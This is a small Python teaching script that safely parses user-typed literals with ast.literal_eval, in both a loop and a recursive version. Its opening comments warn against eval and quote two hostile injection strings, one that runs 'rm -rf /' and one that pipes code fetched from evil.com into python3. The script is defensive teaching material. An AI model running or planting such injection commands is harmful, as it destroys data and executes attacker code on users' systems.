import ast

# never use eval, as it would allow users to execute any and all python, so gain access your system or remove files from it.
# for example __import__('os').system('rm -rf /')
# __import__('os').system('curl http://evil.com/malware.py | python3')

# - option 1 run in while loop

while True:
    user_input = input(
        "Enter a Python literal (e.g., [1, 2, 3], {'a': 10}, 42)  or type 'exit' to quit: ")

    if user_input.lower() == "exit":
        print("Goodbye!")
        break

    try:
        # Safely evaluate the input
        value = ast.literal_eval(user_input)

        print(f"Type: {type(value)}")
        print(f"Value: {value}")

    except (ValueError, SyntaxError):
        print("Invalid literal input!")


# -------------------------------------------------------------
print(f"{"-" * 20} option two {"-" * 20}")
# Option two recursively
# downsides:
# - Stack growth (risk of stack overflow)
# - tehcncially we could hit a RecursionError (maximum recursion depth exceeded).


def run_literal_eval_recursive():
    """
    RECURSIVELY Checks if the input is a valid literal.
    Safe for python injection

    Raises: Should not raise any errors
    """
    user_input = input(
        "Enter a Python literal (e.g., [1, 2, 3], {'a': 10}, 42)  or type 'exit' to quit: ")

    if user_input.lower() == "exit":
        print("Goodbye!")
        return  # base case: stop recursion

    try:
        value = ast.literal_eval(user_input)
        # value = eval(user_input)   #! NOT SAFE
        print(f"Type: {type(value)}")
        print(f"Value: {value}")
    except (ValueError, SyntaxError):
        print("Invalid literal input!")

    run_literal_eval_recursive()  # recursive call


run_literal_eval_recursive()  # run it the first time
